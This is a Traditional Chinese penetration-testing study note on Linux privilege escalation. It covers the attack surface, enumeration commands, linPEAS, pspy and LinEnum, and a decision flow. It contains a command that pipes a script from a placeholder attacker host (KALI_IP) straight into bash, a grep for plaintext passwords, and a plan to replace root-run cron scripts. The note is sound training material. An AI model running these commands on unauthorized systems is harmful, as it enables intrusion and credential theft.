# 第 87 章 - Linux 權限提升簡介

## 標籤

- #cpts
- #chapter
- #linux
- #priv-esc
- #enumeration

## 學習目標

- 理解 Linux 提權在滲透測試中的位置與整體思考框架。
- 能快速識別最高價值的提權面並排序。
- 建立「先枚舉、再排序、最後驗證」的穩定工作流程。
- 知道 linPEAS / LinEnum / pspy 各自的用途和時機。

---

## 理論基礎：Linux 提權攻擊面

| 類別 | 常見路線 | 需要什麼 |
|------|---------|---------|
| sudo 委派錯誤 | GTFObins shell escape | 任何帳號 |
| SUID/SGID | 可控輸入的高權 binary | 任何帳號 |
| Capabilities | cap_setuid / cap_dac_override | 任何帳號 |
| Cron + 可寫腳本 | 替換高權執行腳本 | 任何帳號 |
| 設定檔/憑證 | 找到明文密碼或 SSH key | 任何帳號 |
| 特殊群組 | docker / lxd / disk 群組 | 屬於該群組 |
| 舊版服務 | 已知 CVE | 版本需配對 |
| 核心漏洞 | Dirty COW / PwnKit 等 | 最後手段 |

**提權優先順序**：設定錯誤 > 憑證重用 > 特殊權限 > 服務弱點 > 核心漏洞

---

## 初始列舉序列（取得 shell 後立即執行）

```bash
# ─────────── 身份確認 ───────────
id
# 輸出：uid=1001(user) gid=1001(user) groups=1001(user),4(adm),24(cdrom),27(sudo)
# 重點：groups 欄位 → 有 sudo/docker/lxd/adm/disk 就是高價值

whoami
# 確認當前使用者名稱

# ─────────── sudo 直接看 ───────────
sudo -l
# 列出當前使用者可以 sudo 執行的命令
# NOPASSWD → 不需密碼，直接可用
# (ALL : ALL) ALL → 完整 root

# ─────────── 環境資訊 ───────────
uname -a
# 輸出核心版本（判斷核心漏洞可用性）
# uname → 系統資訊
# -a    → 顯示全部（核心名稱/版本/主機名稱/架構）

cat /etc/os-release
# 發行版名稱與版本
# 用途：配對服務版本漏洞

hostname
# 主機名稱 → 判斷角色（db01/web/dc01）

# ─────────── 使用者與群組 ───────────
cat /etc/passwd | grep -v "nologin\|false"
# 列出有 shell 的帳號（去掉系統帳號）
# grep -v → 反向過濾（排除 nologin/false）

cat /etc/group | grep -E "sudo|docker|lxd|disk|adm"
# 找有提權價值的群組成員

ls -la /home/
# 列出所有使用者家目錄（是否可讀）

# ─────────── 網路資訊 ───────────
ip a
# 顯示所有網路介面和 IP（找內網段）

ss -tlnp
# 列出監聽的 TCP 服務
# -t → TCP
# -l → 只顯示監聽（LISTEN）
# -n → 不做 DNS 解析（數字顯示）
# -p → 顯示對應程序名稱

netstat -tlnp 2>/dev/null || ss -tlnp
# 同上，優先用 netstat，不存在就用 ss
```

---

## 自動化工具

```bash
# ─────────── linPEAS（最全面）───────────
# 從 Kali 傳送到目標
python3 -m http.server 8080
# 目標上下載
curl http://KALI_IP:8080/linpeas.sh | bash
# 或下載後執行（避免回顯太長）
./linpeas.sh 2>/dev/null | tee /tmp/linpeas.txt

# ─────────── pspy（監控程序，找 cron）───────────
./pspy64
# 不需要 root，持續監控所有程序的建立/刪除
# -p    → 輸出程序（預設開啟）
# 重點看：UID=0 的定期執行指令 → 找 cron job

# ─────────── LinEnum ───────────
./LinEnum.sh -t -r report.html
# -t → 測試（更完整掃描）
# -r → 輸出 HTML 報告

# ─────────── 手動優先，工具補充 ───────────
# 工具輸出很多噪音，先手動看 sudo/suid/cron
# 工具用來補齊你可能漏掉的角落
```

---

## 判斷邏輯

```
取得 shell 後：

1. id + sudo -l（30 秒內）
   ├── sudo (ALL) → GTFObins shell escape
   ├── 特殊群組（docker/lxd）→ 第 93 章
   └── 無特殊 → 繼續

2. SUID/Capabilities
   find / -perm -4000 -type f 2>/dev/null
   getcap -r / 2>/dev/null
   └── 有非標準 binary → GTFObins / 手動分析

3. Cron + 可寫路徑
   cat /etc/crontab + pspy64
   └── UID=0 執行的可寫腳本 → 替換/注入

4. 憑證 / 設定檔
   找 .ssh/id_rsa / .conf / web.config / history
   └── 有密碼/key → 直接 SSH 或 su

5. 特殊服務/套件版本
   dpkg -l / rpm -qa
   └── 老舊服務 → searchsploit

6. 核心漏洞（最後）
   uname -a → searchsploit linux kernel X.X
```

---

## 速查表

```bash
# 身份確認
id && sudo -l

# 核心與系統版本
uname -a && cat /etc/os-release

# SUID 找
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron
cat /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/* 2>/dev/null

# 找明文密碼
grep -rl "password\|passwd\|pwd" /var/www /opt /home 2>/dev/null | head -20

# 網路（找內部服務）
ss -tlnp

# linPEAS
curl http://KALI_IP:8080/linpeas.sh | bash
```

---

## 關聯筆記

- [[88-Linux安全模型|第 88 章 - Linux 安全模型]]
- [[89-本機列舉|第 89 章 - 本機列舉]]
- [[90-Sudo|第 90 章 - Sudo]]
- [[91-SUID-SGID與Capabilities|第 91 章 - SUID、SGID 與 Capabilities]]
- [[92-Cron與可寫路徑|第 92 章 - Cron 與可寫路徑]]
- [[93-容器與虛擬化|第 93 章 - 容器與虛擬化]]
- [[94-核心利用|第 94 章 - 核心利用]]
